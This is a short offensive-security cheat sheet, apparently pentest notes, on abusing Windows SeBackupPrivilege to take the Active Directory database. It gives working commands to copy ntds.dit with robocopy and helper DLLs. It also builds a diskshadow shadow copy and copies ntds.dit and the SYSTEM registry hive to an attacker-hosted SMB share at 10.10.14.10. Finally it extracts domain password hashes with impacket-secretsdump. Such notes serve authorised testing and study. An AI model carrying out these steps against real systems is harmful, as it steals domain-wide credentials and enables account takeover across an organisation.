---
title: "SeBackupPrivilege/SeRestorePrivilege"
date: 2024-7-18
tags: ["SeBackupPrivilege", "SeRestorePrivilege", "privesc", "Windows", "Backup Operators", "diskshadow", "secretsdump"]
---

---
### Abuse #1: Robocopy

<div>

```powershell
# For example
robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
```

</div>

<br>

---

### Abuse #2: Using helper dlls

<div>

```powershell
import-module .\SeBackupPrivilegeCmdLets.dll
```

```powershell
import-module .\SeBackupPrivilegeUtils.dll
```

```powershell
Copy-FileSeBackupPrivilege <TARGET_FILE_PATH> C:\ProgramData\<TARGET_FILE>
```

```powershell
# For example
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
```

</div>

<small>*Ref: [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true)*</small>
<br>
<small>*Ref: [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true)*</small>

<br>

---

### Abuse #3: Diskshadow

#### 1. Create a .dsh file

<div>

```bash
set context persistent nowriters
set metadata C:\ProgramData\test.cab
set verbose on
add volume c: alias test
create
expose %test% x:
```

</div>

<br>

<div>

```bash
# Convert to dos format
unix2dos vss.dsh
```

</div>

#### 2. Run vss.dsh

<div>

```powershell
# Upload and run
diskshadow /s C:\ProgramData\vss.dsh
```

</div>

#### 3. Host a smb server (In Linux)

<div>

```bash
impacket-smbserver share . -smb2support
```

</div>

#### 4. Copy to local Linux

<div>

```bash
net use \\10.10.14.10\share
```

```bash
Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.10\share\ntds.dit
```

```bash
reg.exe save hklm\system \\10.10.14.10\share\system
```

</div>

#### 5. Secrets dump

<div>

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

</div>

<br>